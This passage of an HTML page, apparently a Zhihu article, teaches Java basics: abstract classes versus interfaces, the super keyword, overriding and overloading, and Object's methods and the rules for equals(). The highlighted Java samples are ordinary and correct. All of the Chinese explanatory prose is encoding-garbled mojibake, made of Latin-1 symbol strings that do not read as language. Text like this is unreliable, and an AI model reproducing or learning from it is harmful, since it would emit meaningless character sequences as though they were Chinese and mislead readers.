class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;func1&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"c1\">// AbstractClassExample ac1 = new AbstractClassExample(); // &#39;AbstractClassExample&#39; is abstract; cannot be instantiated\n</span><span class=\"c1\"></span><span class=\"n\">AbstractClassExample</span> <span class=\"n\">ac2</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">AbstractExtendClassExample</span><span class=\"o\">();</span>\n<span class=\"n\">ac2</span><span class=\"o\">.</span><span class=\"na\">func1</span><span class=\"o\">();</span></code></pre></div><p><b>2. æ¥å£</b> </p><p>æ¥å£æ˜¯æŠ½è±¡ç±»çš„å»¶ä¼¸ï¼Œåœ¨ Java 8 ä¹‹å‰ï¼Œå®ƒå¯ä»¥çœ‹æˆæ˜¯ä¸€ä¸ªå®Œå…¨æŠ½è±¡çš„ç±»ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä¸èƒ½æœ‰ä»»ä½•çš„æ–¹æ³•å®ç°ã€‚</p><p>ä» Java 8 å¼€å§‹ï¼Œæ¥å£ä¹Ÿå¯ä»¥æ‹¥æœ‰é»˜è®¤çš„æ–¹æ³•å®ç°ï¼Œè¿™æ˜¯å› ä¸ºä¸æ”¯æŒé»˜è®¤æ–¹æ³•çš„æ¥å£çš„ç»´æŠ¤æˆæœ¬å¤ªé«˜äº†ã€‚åœ¨ Java 8 ä¹‹å‰ï¼Œå¦‚æœä¸€ä¸ªæ¥å£æƒ³è¦æ·»åŠ æ–°çš„æ–¹æ³•ï¼Œé‚£ä¹ˆè¦ä¿®æ”¹æ‰€æœ‰å®ç°äº†è¯¥æ¥å£çš„ç±»ã€‚</p><p>æ¥å£çš„æˆå‘˜ï¼ˆå­—æ®µ + æ–¹æ³•ï¼‰é»˜è®¤éƒ½æ˜¯ public çš„ï¼Œå¹¶ä¸”ä¸å…è®¸å®šä¹‰ä¸º private æˆ–è€… protectedã€‚</p><p>æ¥å£çš„å­—æ®µé»˜è®¤éƒ½æ˜¯ static å’Œ final çš„ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">interface</span> <span class=\"nc\">InterfaceExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kt\">void</span> <span class=\"nf\">func1</span><span class=\"o\">();</span>\n\n    <span class=\"k\">default</span> <span class=\"kt\">void</span> <span class=\"nf\">func2</span><span class=\"o\">(){</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;func2&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kt\">int</span> <span class=\"n\">x</span> <span class=\"o\">=</span> <span class=\"n\">123</span><span class=\"o\">;</span>\n    <span class=\"c1\">// int y;               // Variable &#39;y&#39; might not have been initialized\n</span><span class=\"c1\"></span>    <span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"n\">z</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>       <span class=\"c1\">// Modifier &#39;public&#39; is redundant for interface fields\n</span><span class=\"c1\"></span>    <span class=\"c1\">// private int k = 0;   // Modifier &#39;private&#39; not allowed here\n</span><span class=\"c1\"></span>    <span class=\"c1\">// protected int l = 0; // Modifier &#39;protected&#39; not allowed here\n</span><span class=\"c1\"></span>    <span class=\"c1\">// private void fun3(); // Modifier &#39;private&#39; not allowed here\n</span><span class=\"c1\"></span><span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">InterfaceImplementExample</span> <span class=\"kd\">implements</span> <span class=\"n\">InterfaceExample</span> <span class=\"o\">{</span>\n    <span class=\"nd\">@Override</span>\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">func1</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;func1&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"c1\">// InterfaceExample ie1 = new InterfaceExample(); // &#39;InterfaceExample&#39; is abstract; cannot be instantiated\n</span><span class=\"c1\"></span><span class=\"n\">InterfaceExample</span> <span class=\"n\">ie2</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">InterfaceImplementExample</span><span class=\"o\">();</span>\n<span class=\"n\">ie2</span><span class=\"o\">.</span><span class=\"na\">func1</span><span class=\"o\">();</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">InterfaceExample</span><span class=\"o\">.</span><span class=\"na\">x</span><span class=\"o\">);</span></code></pre></div><p><b>3. æ¯”è¾ƒ</b> </p><ul><li>ä»è®¾è®¡å±‚é¢ä¸Šçœ‹ï¼ŒæŠ½è±¡ç±»æä¾›äº†ä¸€ç§ IS-A å…³ç³»ï¼Œé‚£ä¹ˆå°±å¿…é¡»æ»¡è¶³é‡Œå¼æ›¿æ¢åŸåˆ™ï¼Œå³å­ç±»å¯¹è±¡å¿…é¡»èƒ½å¤Ÿæ›¿æ¢æ‰æ‰€æœ‰çˆ¶ç±»å¯¹è±¡ã€‚è€Œæ¥å£æ›´åƒæ˜¯ä¸€ç§ LIKE-A å…³ç³»ï¼Œå®ƒåªæ˜¯æä¾›ä¸€ç§æ–¹æ³•å®ç°å¥‘çº¦ï¼Œå¹¶ä¸è¦æ±‚æ¥å£å’Œå®ç°æ¥å£çš„ç±»å…·æœ‰ IS-A å…³ç³»ã€‚</li><li>ä»ä½¿ç”¨ä¸Šæ¥çœ‹ï¼Œä¸€ä¸ªç±»å¯ä»¥å®ç°å¤šä¸ªæ¥å£ï¼Œä½†æ˜¯ä¸èƒ½ç»§æ‰¿å¤šä¸ªæŠ½è±¡ç±»ã€‚</li><li>æ¥å£çš„å­—æ®µåªèƒ½æ˜¯ static å’Œ final ç±»å‹çš„ï¼Œè€ŒæŠ½è±¡ç±»çš„å­—æ®µæ²¡æœ‰è¿™ç§é™åˆ¶ã€‚</li><li>æ¥å£çš„æˆå‘˜åªèƒ½æ˜¯ public çš„ï¼Œè€ŒæŠ½è±¡ç±»çš„æˆå‘˜å¯ä»¥æœ‰å¤šç§è®¿é—®æƒé™ã€‚</li></ul><p><b>4. ä½¿ç”¨é€‰æ‹©</b> </p><p>ä½¿ç”¨æ¥å£ï¼š</p><ul><li>éœ€è¦è®©ä¸ç›¸å…³çš„ç±»éƒ½å®ç°ä¸€ä¸ªæ–¹æ³•ï¼Œä¾‹å¦‚ä¸ç›¸å…³çš„ç±»éƒ½å¯ä»¥å®ç° Compareable æ¥å£ä¸­çš„ compareTo() æ–¹æ³•ï¼›</li><li>éœ€è¦ä½¿ç”¨å¤šé‡ç»§æ‰¿ã€‚</li></ul><p>ä½¿ç”¨æŠ½è±¡ç±»ï¼š</p><ul><li>éœ€è¦åœ¨å‡ ä¸ªç›¸å…³çš„ç±»ä¸­å…±äº«ä»£ç ã€‚</li><li>éœ€è¦èƒ½æ§åˆ¶ç»§æ‰¿æ¥çš„æˆå‘˜çš„è®¿é—®æƒé™ï¼Œè€Œä¸æ˜¯éƒ½ä¸º publicã€‚</li><li>éœ€è¦ç»§æ‰¿éé™æ€å’Œéå¸¸é‡å­—æ®µã€‚</li></ul><p>åœ¨å¾ˆå¤šæƒ…å†µä¸‹ï¼Œæ¥å£ä¼˜å…ˆäºæŠ½è±¡ç±»ã€‚å› ä¸ºæ¥å£æ²¡æœ‰æŠ½è±¡ç±»ä¸¥æ ¼çš„ç±»å±‚æ¬¡ç»“æ„è¦æ±‚ï¼Œå¯ä»¥çµæ´»åœ°ä¸ºä¸€ä¸ªç±»æ·»åŠ è¡Œä¸ºã€‚å¹¶ä¸”ä» Java 8 å¼€å§‹ï¼Œæ¥å£ä¹Ÿå¯ä»¥æœ‰é»˜è®¤çš„æ–¹æ³•å®ç°ï¼Œä½¿å¾—ä¿®æ”¹æ¥å£çš„æˆæœ¬ä¹Ÿå˜çš„å¾ˆä½ã€‚</p><ul><li><a href=\"https://link.zhihu.com/?target=https%3A//docs.oracle.com/javase/tutorial/java/IandI/abstract.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Abstract Methods and Classes</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.ibm.com/developerworks/cn/java/l-javainterface-abstract/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">æ·±å…¥ç†è§£ abstract class å’Œ interface</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//dzone.com/articles/when-to-use-abstract-class-and-intreface\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">When to Use Abstract Class and Interface</a></li></ul><h2>super</h2><ul><li>è®¿é—®çˆ¶ç±»çš„æ„é€ å‡½æ•°ï¼šå¯ä»¥ä½¿ç”¨ super() å‡½æ•°è®¿é—®çˆ¶ç±»çš„æ„é€ å‡½æ•°ï¼Œä»è€Œå§”æ‰˜çˆ¶ç±»å®Œæˆä¸€äº›åˆå§‹åŒ–çš„å·¥ä½œã€‚</li><li>è®¿é—®çˆ¶ç±»çš„æˆå‘˜ï¼šå¦‚æœå­ç±»é‡å†™äº†çˆ¶ç±»çš„æŸä¸ªæ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨ super å…³é”®å­—æ¥å¼•ç”¨çˆ¶ç±»çš„æ–¹æ³•å®ç°ã€‚</li></ul><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">SuperExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">protected</span> <span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"o\">;</span>\n    <span class=\"kd\">protected</span> <span class=\"kt\">int</span> <span class=\"n\">y</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"nf\">SuperExample</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">y</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">x</span> <span class=\"o\">=</span> <span class=\"n\">x</span><span class=\"o\">;</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">y</span> <span class=\"o\">=</span> <span class=\"n\">y</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">func</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;SuperExample.func()&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">SuperExtendExample</span> <span class=\"kd\">extends</span> <span class=\"n\">SuperExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">z</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"nf\">SuperExtendExample</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">y</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">z</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"kd\">super</span><span class=\"o\">(</span><span class=\"n\">x</span><span class=\"o\">,</span> <span class=\"n\">y</span><span class=\"o\">);</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">z</span> <span class=\"o\">=</span> <span class=\"n\">z</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"nd\">@Override</span>\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">func</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"kd\">super</span><span class=\"o\">.</span><span class=\"na\">func</span><span class=\"o\">();</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;SuperExtendExample.func()&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"n\">SuperExample</span> <span class=\"n\">e</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">SuperExtendExample</span><span class=\"o\">(</span><span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">2</span><span class=\"o\">,</span> <span class=\"n\">3</span><span class=\"o\">);</span>\n<span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">func</span><span class=\"o\">();</span>\n<span class=\"n\">SuperExample</span><span class=\"o\">.</span><span class=\"na\">func</span><span class=\"o\">()</span>\n<span class=\"n\">SuperExtendExample</span><span class=\"o\">.</span><span class=\"na\">func</span><span class=\"o\">()</span></code></pre></div><p><a href=\"https://link.zhihu.com/?target=https%3A//docs.oracle.com/javase/tutorial/java/IandI/super.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Using the Keyword super</a></p><h2>é‡å†™ä¸é‡è½½</h2><p><b>1. é‡å†™ï¼ˆOverrideï¼‰</b> </p><p>å­˜åœ¨äºç»§æ‰¿ä½“ç³»ä¸­ï¼ŒæŒ‡å­ç±»å®ç°äº†ä¸€ä¸ªä¸çˆ¶ç±»åœ¨æ–¹æ³•å£°æ˜ä¸Šå®Œå…¨ç›¸åŒçš„ä¸€ä¸ªæ–¹æ³•ã€‚</p><p>ä¸ºäº†æ»¡è¶³é‡Œå¼æ›¿æ¢åŸåˆ™ï¼Œé‡å†™æœ‰ä»¥ä¸‹ä¸‰ä¸ªé™åˆ¶ï¼š</p><ul><li>å­ç±»æ–¹æ³•çš„è®¿é—®æƒé™å¿…é¡»å¤§äºç­‰äºçˆ¶ç±»æ–¹æ³•ï¼›</li><li>å­ç±»æ–¹æ³•çš„è¿”å›ç±»å‹å¿…é¡»æ˜¯çˆ¶ç±»æ–¹æ³•è¿”å›ç±»å‹æˆ–ä¸ºå…¶å­ç±»å‹ã€‚</li><li>å­ç±»æ–¹æ³•æŠ›å‡ºçš„å¼‚å¸¸ç±»å‹å¿…é¡»æ˜¯çˆ¶ç±»æŠ›å‡ºå¼‚å¸¸ç±»å‹æˆ–ä¸ºå…¶å­ç±»å‹ã€‚</li></ul><p>ä½¿ç”¨ @Override æ³¨è§£ï¼Œå¯ä»¥è®©ç¼–è¯‘å™¨å¸®å¿™æ£€æŸ¥æ˜¯å¦æ»¡è¶³ä¸Šé¢çš„ä¸‰ä¸ªé™åˆ¶æ¡ä»¶ã€‚</p><p>ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼ŒSubClass ä¸º SuperClass çš„å­ç±»ï¼ŒSubClass é‡å†™äº† SuperClass çš„ func() æ–¹æ³•ã€‚å…¶ä¸­ï¼š</p><ul><li>å­ç±»æ–¹æ³•è®¿é—®æƒé™ä¸º publicï¼Œå¤§äºçˆ¶ç±»çš„ protectedã€‚</li><li>å­ç±»çš„è¿”å›ç±»å‹ä¸º ArrayListï¼Œæ˜¯çˆ¶ç±»è¿”å›ç±»å‹ List çš„å­ç±»ã€‚</li><li>å­ç±»æŠ›å‡ºçš„å¼‚å¸¸ç±»å‹ä¸º Exceptionï¼Œæ˜¯çˆ¶ç±»æŠ›å‡ºå¼‚å¸¸ Throwable çš„å­ç±»ã€‚</li><li>å­ç±»é‡å†™æ–¹æ³•ä½¿ç”¨ @Override æ³¨è§£ï¼Œä»è€Œè®©ç¼–è¯‘å™¨è‡ªåŠ¨æ£€æŸ¥æ˜¯å¦æ»¡è¶³é™åˆ¶æ¡ä»¶ã€‚</li></ul><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">class</span> <span class=\"nc\">SuperClass</span> <span class=\"o\">{</span>\n    <span class=\"kd\">protected</span> <span class=\"n\">List</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"nf\">func</span><span class=\"o\">()</span> <span class=\"kd\">throws</span> <span class=\"n\">Throwable</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">class</span> <span class=\"nc\">SubClass</span> <span class=\"kd\">extends</span> <span class=\"n\">SuperClass</span> <span class=\"o\">{</span>\n    <span class=\"nd\">@Override</span>\n    <span class=\"kd\">public</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"nf\">func</span><span class=\"o\">()</span> <span class=\"kd\">throws</span> <span class=\"n\">Exception</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><p>åœ¨è°ƒç”¨ä¸€ä¸ªæ–¹æ³•æ—¶ï¼Œå…ˆä»æœ¬ç±»ä¸­æŸ¥æ‰¾çœ‹æ˜¯å¦æœ‰å¯¹åº”çš„æ–¹æ³•ï¼Œå¦‚æœæ²¡æœ‰æŸ¥æ‰¾åˆ°å†åˆ°çˆ¶ç±»ä¸­æŸ¥çœ‹ï¼Œçœ‹æ˜¯å¦æœ‰ç»§æ‰¿æ¥çš„æ–¹æ³•ã€‚å¦åˆ™å°±è¦å¯¹å‚æ•°è¿›è¡Œè½¬å‹ï¼Œè½¬æˆçˆ¶ç±»ä¹‹åçœ‹æ˜¯å¦æœ‰å¯¹åº”çš„æ–¹æ³•ã€‚æ€»çš„æ¥è¯´ï¼Œæ–¹æ³•è°ƒç”¨çš„ä¼˜å…ˆçº§ä¸ºï¼š</p><ul><li>this.func(this)</li><li>super.func(this)</li><li>this.func(super)</li><li>super.func(super)</li></ul><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"cm\">/*\n</span><span class=\"cm\">    A\n</span><span class=\"cm\">    |\n</span><span class=\"cm\">    B\n</span><span class=\"cm\">    |\n</span><span class=\"cm\">    C\n</span><span class=\"cm\">    |\n</span><span class=\"cm\">    D\n</span><span class=\"cm\"> */</span>\n\n\n<span class=\"kd\">class</span> <span class=\"nc\">A</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">show</span><span class=\"o\">(</span><span class=\"n\">A</span> <span class=\"n\">obj</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;A.show(A)&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">show</span><span class=\"o\">(</span><span class=\"n\">C</span> <span class=\"n\">obj</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;A.show(C)&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">class</span> <span class=\"nc\">B</span> <span class=\"kd\">extends</span> <span class=\"n\">A</span> <span class=\"o\">{</span>\n\n    <span class=\"nd\">@Override</span>\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">show</span><span class=\"o\">(</span><span class=\"n\">A</span> <span class=\"n\">obj</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;B.show(A)&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">class</span> <span class=\"nc\">C</span> <span class=\"kd\">extends</span> <span class=\"n\">B</span> <span class=\"o\">{</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">class</span> <span class=\"nc\">D</span> <span class=\"kd\">extends</span> <span class=\"n\">C</span> <span class=\"o\">{</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n\n    <span class=\"n\">A</span> <span class=\"n\">a</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">A</span><span class=\"o\">();</span>\n    <span class=\"n\">B</span> <span class=\"n\">b</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">B</span><span class=\"o\">();</span>\n    <span class=\"n\">C</span> <span class=\"n\">c</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">C</span><span class=\"o\">();</span>\n    <span class=\"n\">D</span> <span class=\"n\">d</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">D</span><span class=\"o\">();</span>\n\n    <span class=\"c1\">// åœ¨ A ä¸­å­˜åœ¨ show(A obj)ï¼Œç›´æ¥è°ƒç”¨\n</span><span class=\"c1\"></span>    <span class=\"n\">a</span><span class=\"o\">.</span><span class=\"na\">show</span><span class=\"o\">(</span><span class=\"n\">a</span><span class=\"o\">);</span> <span class=\"c1\">// A.show(A)\n</span><span class=\"c1\"></span>    <span class=\"c1\">// åœ¨ A ä¸­ä¸å­˜åœ¨ show(B obj)ï¼Œå°† B è½¬å‹æˆå…¶çˆ¶ç±» A\n</span><span class=\"c1\"></span>    <span class=\"n\">a</span><span class=\"o\">.</span><span class=\"na\">show</span><span class=\"o\">(</span><span class=\"n\">b</span><span class=\"o\">);</span> <span class=\"c1\">// A.show(A)\n</span><span class=\"c1\"></span>    <span class=\"c1\">// åœ¨ B ä¸­å­˜åœ¨ä» A ç»§æ‰¿æ¥çš„ show(C obj)ï¼Œç›´æ¥è°ƒç”¨\n</span><span class=\"c1\"></span>    <span class=\"n\">b</span><span class=\"o\">.</span><span class=\"na\">show</span><span class=\"o\">(</span><span class=\"n\">c</span><span class=\"o\">);</span> <span class=\"c1\">// A.show(C)\n</span><span class=\"c1\"></span>    <span class=\"c1\">// åœ¨ B ä¸­ä¸å­˜åœ¨ show(D obj)ï¼Œä½†æ˜¯å­˜åœ¨ä» A ç»§æ‰¿æ¥çš„ show(C obj)ï¼Œå°† D è½¬å‹æˆå…¶çˆ¶ç±» C\n</span><span class=\"c1\"></span>    <span class=\"n\">b</span><span class=\"o\">.</span><span class=\"na\">show</span><span class=\"o\">(</span><span class=\"n\">d</span><span class=\"o\">);</span> <span class=\"c1\">// A.show(C)\n</span><span class=\"c1\"></span>\n    <span class=\"c1\">// å¼•ç”¨çš„è¿˜æ˜¯ B å¯¹è±¡ï¼Œæ‰€ä»¥ ba å’Œ b çš„è°ƒç”¨ç»“æœä¸€æ ·\n</span><span class=\"c1\"></span>    <span class=\"n\">A</span> <span class=\"n\">ba</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">B</span><span class=\"o\">();</span>\n    <span class=\"n\">ba</span><span class=\"o\">.</span><span class=\"na\">show</span><span class=\"o\">(</span><span class=\"n\">c</span><span class=\"o\">);</span> <span class=\"c1\">// A.show(C)\n</span><span class=\"c1\"></span>    <span class=\"n\">ba</span><span class=\"o\">.</span><span class=\"na\">show</span><span class=\"o\">(</span><span class=\"n\">d</span><span class=\"o\">);</span> <span class=\"c1\">// A.show(C)\n</span><span class=\"c1\"></span><span class=\"o\">}</span></code></pre></div><p><b>2. é‡è½½ï¼ˆOverloadï¼‰</b> </p><p>å­˜åœ¨äºåŒä¸€ä¸ªç±»ä¸­ï¼ŒæŒ‡ä¸€ä¸ªæ–¹æ³•ä¸å·²ç»å­˜åœ¨çš„æ–¹æ³•åç§°ä¸Šç›¸åŒï¼Œä½†æ˜¯å‚æ•°ç±»å‹ã€ä¸ªæ•°ã€é¡ºåºè‡³å°‘æœ‰ä¸€ä¸ªä¸åŒã€‚</p><p>åº”è¯¥æ³¨æ„çš„æ˜¯ï¼Œè¿”å›å€¼ä¸åŒï¼Œå…¶å®ƒéƒ½ç›¸åŒä¸ç®—æ˜¯é‡è½½ã€‚</p><h2>äº”ã€Object é€šç”¨æ–¹æ³•</h2><h2>æ¦‚è§ˆ</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">native</span> <span class=\"kt\">int</span> <span class=\"nf\">hashCode</span><span class=\"o\">()</span>\n\n<span class=\"kd\">public</span> <span class=\"kt\">boolean</span> <span class=\"nf\">equals</span><span class=\"o\">(</span><span class=\"n\">Object</span> <span class=\"n\">obj</span><span class=\"o\">)</span>\n\n<span class=\"kd\">protected</span> <span class=\"kd\">native</span> <span class=\"n\">Object</span> <span class=\"nf\">clone</span><span class=\"o\">()</span> <span class=\"kd\">throws</span> <span class=\"n\">CloneNotSupportedException</span>\n\n<span class=\"kd\">public</span> <span class=\"n\">String</span> <span class=\"nf\">toString</span><span class=\"o\">()</span>\n\n<span class=\"kd\">public</span> <span class=\"kd\">final</span> <span class=\"kd\">native</span> <span class=\"n\">Class</span><span class=\"o\">&lt;?&gt;</span> <span class=\"n\">getClass</span><span class=\"o\">()</span>\n\n<span class=\"kd\">protected</span> <span class=\"kt\">void</span> <span class=\"nf\">finalize</span><span class=\"o\">()</span> <span class=\"kd\">throws</span> <span class=\"n\">Throwable</span> <span class=\"o\">{}</span>\n\n<span class=\"kd\">public</span> <span class=\"kd\">final</span> <span class=\"kd\">native</span> <span class=\"kt\">void</span> <span class=\"nf\">notify</span><span class=\"o\">()</span>\n\n<span class=\"kd\">public</span> <span class=\"kd\">final</span> <span class=\"kd\">native</span> <span class=\"kt\">void</span> <span class=\"nf\">notifyAll</span><span class=\"o\">()</span>\n\n<span class=\"kd\">public</span> <span class=\"kd\">final</span> <span class=\"kd\">native</span> <span class=\"kt\">void</span> <span class=\"nf\">wait</span><span class=\"o\">(</span><span class=\"kt\">long</span> <span class=\"n\">timeout</span><span class=\"o\">)</span> <span class=\"kd\">throws</span> <span class=\"n\">InterruptedException</span>\n\n<span class=\"kd\">public</span> <span class=\"kd\">final</span> <span class=\"kt\">void</span> <span class=\"nf\">wait</span><span class=\"o\">(</span><span class=\"kt\">long</span> <span class=\"n\">timeout</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">nanos</span><span class=\"o\">)</span> <span class=\"kd\">throws</span> <span class=\"n\">InterruptedException</span>\n\n<span class=\"kd\">public</span> <span class=\"kd\">final</span> <span class=\"kt\">void</span> <span class=\"nf\">wait</span><span class=\"o\">()</span> <span class=\"kd\">throws</span> <span class=\"n\">InterruptedException</span></code></pre></div><h2>equals()</h2><p><b>1. ç­‰ä»·å…³ç³»</b> </p><p>â…  è‡ªåæ€§</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">x</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">x</span><span class=\"o\">);</span> <span class=\"o\">//</span> <span class=\"kc\">true</span></code></pre></div><p>â…¡ å¯¹ç§°æ€§</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">x</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">y</span><span class=\"o\">)</span> <span class=\"o\">==</span> <span class=\"n\">y</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">x</span><span class=\"o\">);</span> <span class=\"o\">//</span> <span class=\"kc\">true</span></code></pre></div><p>â…¢ ä¼ é€’æ€§</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">x</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">y</span><span class=\"o\">)</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">y</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">z</span><span class=\"o\">))</span>\n    <span class=\"n\">x</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">z</span><span class=\"o\">);</span> <span class=\"o\">//</span> <span class=\"kc\">true</span><span class=\"o\">;</span></code></pre></div><p>â…£ ä¸€è‡´æ€§</p><p>å¤šæ¬¡è°ƒç”¨ equals() æ–¹æ³•ç»“æœä¸å˜</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">x</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">y</span><span class=\"o\">)</span> <span class=\"o\">==</span> <span class=\"n\">x</span><span class=\"o\">.</span><span 